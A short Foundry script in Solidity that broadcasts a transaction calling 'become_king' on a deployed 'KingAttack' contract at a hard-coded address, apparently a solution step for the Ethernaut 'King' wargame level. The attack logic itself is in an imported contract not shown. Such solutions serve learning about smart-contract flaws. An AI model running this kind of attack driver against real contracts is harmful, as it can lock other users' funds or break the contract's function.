// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {KingAttack} from "../src/KingAttack.sol";

contract KingScript is Script {
    function run() public {
        KingAttack attack = KingAttack(payable(0xB3712F4277F6920521076Ad39d47EaDCA8529238));

        vm.startBroadcast();
        attack.become_king{value: 1000000000000001 wei}(0x32cd132899B1dd7f48D51aC3D491689b63ba7E4E);
        vm.stopBroadcast();
    }
}